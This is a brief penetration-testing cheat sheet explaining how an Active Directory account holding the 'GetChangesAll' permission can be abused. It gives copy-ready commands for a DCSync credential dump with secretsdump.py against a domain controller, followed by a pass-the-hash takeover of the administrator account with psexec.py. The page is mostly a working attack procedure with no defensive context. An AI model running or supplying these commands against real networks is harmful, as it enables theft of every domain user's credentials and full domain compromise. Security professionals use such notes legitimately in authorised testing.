# GetChangesAll: Privilege Escalation

If current account has `GetChangesAll` permission, then a [DCSync attack](https://www.hackingarticles.in/credential-dumping-dcsync-attack/) can potentially be launched. 

1. Fetch NTLM hashes of all domain users, and take a note of domain administrator NTLM hash

        secretsdump.py -dc-ip 10.10.10.4 DOMAIN.LOCAL/username:Password123@10.10.10.4

2. Launch [Pass-the-Hash](https://attack.stealthbits.com/pass-the-hash-attack-explained) attack using [Impacket](../../../Network/Network/impacket_tools/README.md)'s `psexec.py` script

        $ psexec.py domain.local/administrator@10.10.10.4 -hashes <NTML hash>:<NTLM hash>

## References

* https://www.hackingarticles.in/credential-dumping-dcsync-attack/
* https://attack.stealthbits.com/pass-the-hash-attack-explained